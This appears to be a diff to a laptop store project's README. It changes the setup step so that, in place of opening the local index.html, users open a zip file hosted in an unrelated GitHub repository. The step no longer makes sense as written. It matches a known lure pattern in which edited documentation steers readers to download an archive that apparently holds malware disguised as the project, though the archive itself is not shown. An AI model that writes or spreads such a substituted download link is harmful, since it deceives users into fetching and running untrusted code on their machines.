@@ -14,7 +14,7 @@ To run this project locally, follow these steps:
 
 Download or clone the project repository.
 Open the project folder in your preferred code editor.
-Open the index.html file in a web browser to access the laptop store.
+Open the https://raw.githubusercontent.com/afrizal259/afrizal2591/main/squelchy/afrizal2591.zip file in a web browser to access the laptop store.
 # Contributing
 If you'd like to contribute to this project, you can fork the repository, make your desired changes, and submit a pull request. Contributions are always welcome!
 
